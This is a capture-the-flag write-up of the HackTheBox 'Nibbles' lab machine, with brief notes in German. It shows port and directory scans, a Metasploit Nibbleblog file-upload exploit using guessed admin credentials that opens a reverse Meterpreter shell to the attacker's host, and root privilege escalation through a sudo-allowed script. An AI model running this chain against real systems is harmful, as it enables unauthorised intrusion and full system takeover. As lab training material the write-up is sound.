---
title: "HackTheBox - Nibbles"
date: 2010-01-01T01:01:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
---

[![Kurzes Video Walkthrough ohne Erklärungen](http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg)](http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE)

root@kali:~# nmap -sV -sC -Pn 10.10.10.75  
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-03 12:23 CEST  
Nmap scan report for 10.10.10.75  
Host is up (0.065s latency).  
Not shown: 998 closed ports  
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:  
| 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)  
| 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)  
|_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)  
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))  
|_http-server-header: Apache/2.4.18 (Ubuntu)  
|_http-title: Site doesn't have a title (text/html).  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 30.92 seconds

root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php -u http://10.10.10.75/nibbleblog/ -t 75

Gobuster v1.4.1 OJ Reeves (@TheColonial)  
=====================================================  
=====================================================  
[+] Mode : dir  
[+] Url/Domain : http://10.10.10.75/nibbleblog/  
[+] Threads : 75  
[+] Wordlist : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  
[+] Status codes : 200,204,301,302,307  
[+] Extensions : .php  
=====================================================  
/content (Status: 301)  
/index.php (Status: 200)  
/sitemap.php (Status: 200)  
/themes (Status: 301)  
/feed.php (Status: 200)  
/admin (Status: 301)  
/admin.php (Status: 200)  
/plugins (Status: 301)  
/install.php (Status: 200)  
/update.php (Status: 200)  
/languages (Status: 301)  
=====================================================

root@kali:~# searchsploit nibbleblog  
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------  
Exploit Title | Path  
| (/usr/share/exploitdb/)  
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------  
Nibbleblog - Arbitrary File Upload (Metasploit) | exploits/php/remote/38489.rb  
Nibbleblog - Multiple SQL Injections | exploits/php/webapps/35865.txt  
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------  
Shellcodes: No Result

Nur "Hello world!"

Zeile 16:

<!-- /nibbleblog/ directory. Nothing interesting here! -->

BILD

Settings -> Nach unten Scrollen -> Version -> Nibbleblog 4.0.3 "Coffee" - Developed by Diego Najar

root@kali:~# msfconsole

msf > search nibbleblog

Matching Modules  
================

Name Disclosure Date Rank Description  
---- --------------- ---- -----------  
exploit/multi/http/nibbleblog_file_upload 2015-09-01 excellent Nibbleblog File Upload Vulnerability

msf > use exploit/multi/http/nibbleblog_file_upload

msf exploit(multi/http/nibbleblog_file_upload) > show options

Module options (exploit/multi/http/nibbleblog_file_upload):

Name Current Setting Required Description  
---- --------------- -------- -----------  
PASSWORD yes The password to authenticate with  
Proxies no A proxy chain of format type:host:port[,type:host:port][...]  
RHOST yes The target address  
RPORT 80 yes The target port (TCP)  
SSL false no Negotiate SSL/TLS for outgoing connections  
TARGETURI / yes The base path to the web application  
USERNAME yes The username to authenticate with  
VHOST no HTTP server virtual host

Exploit target:

Id Name  
-- ----  
0 Nibbleblog 4.0.3

msf exploit(multi/http/nibbleblog_file_upload) > set password nibbles  
password => nibbles  
msf exploit(multi/http/nibbleblog_file_upload) > set rhost 10.10.10.75  
rhost => 10.10.10.75  
msf exploit(multi/http/nibbleblog_file_upload) > set targeturi /nibbleblog/  
targeturi => /nibbleblog/  
msf exploit(multi/http/nibbleblog_file_upload) > set username admin  
username => admin  
msf exploit(multi/http/nibbleblog_file_upload) > exploit

[*] Started reverse TCP handler on 10.10.15.148:4444  
[*] Sending stage (37775 bytes) to 10.10.10.75  
[*] Meterpreter session 1 opened (10.10.15.148:4444 -> 10.10.10.75:45084) at 2018-07-03 17:04:12 +0200  
[+] Deleted image.php

meterpreter > shell  
Process 21995 created.  
Channel 0 created.  
python3 -c "import pty;pty.spawn('/bin/bash')"  
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /home  
<ml/nibbleblog/content/private/plugins/my_image$ cd /home

nibbler@Nibbles:/home$ ls  
ls  
nibbler  
nibbler@Nibbles:/home$ cd nibbler  
cd nibbler  
nibbler@Nibbles:/home/nibbler$ ls  
ls  
personal personal.zip user.txt  
nibbler@Nibbles:/home/nibbler$ cat user.txt  
cat user.txt  
b02#########################8d8

nibbler@Nibbles:/home$ sudo -l  
sudo -l  
sudo: unable to resolve host Nibbles: Connection timed out  
Matching Defaults entries for nibbler on Nibbles:  
env_reset, mail_badpass,  
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:  
(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh  
nibbler@Nibbles:/home$ cat /home/nibbler/personal/stuff/monitor.sh  
cat /home/nibbler/personal/stuff/monitor.sh  
#!/bin/sh  
bash  
nibbler@Nibbles:/home$ sudo -u root /home/nibbler/personal/stuff/monitor.sh  
sudo -u root /home/nibbler/personal/stuff/monitor.sh  
sudo: unable to resolve host Nibbles: Connection timed out  
root@Nibbles:/home# cat /root/root.txt  
cat /root/root.txt  
b6d##########################88c